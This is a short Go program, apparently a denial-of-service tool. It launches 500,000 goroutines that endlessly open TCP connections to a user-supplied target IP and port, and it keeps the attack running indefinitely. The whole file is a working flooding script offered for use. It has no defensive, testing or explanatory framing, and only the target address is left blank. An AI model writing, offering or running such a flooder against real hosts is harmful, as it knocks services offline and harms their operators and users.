package main

import (
	"fmt"
	"net"
	"sync"
	"time"
)

// Maximum number of goroutines
const maxGoroutines = 500000

func main() {
	ip := ""   // replace with desired target IP
	port := 80 // replace with desired target port
	var wg sync.WaitGroup
	wg.Add(maxGoroutines)

	for i := 0; i < maxGoroutines; i++ {
		go ddos(ip, port, &wg)
	}

	// Keep the attack alive
	for {
		time.Sleep(time.Second * 5)
	}
}

func ddos(ip string, port int, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", ip, port)
	for {
		_, err := net.Dial("tcp", addr)
		if err != nil {
			fmt.Println(err)
			continue
		}
	}
}
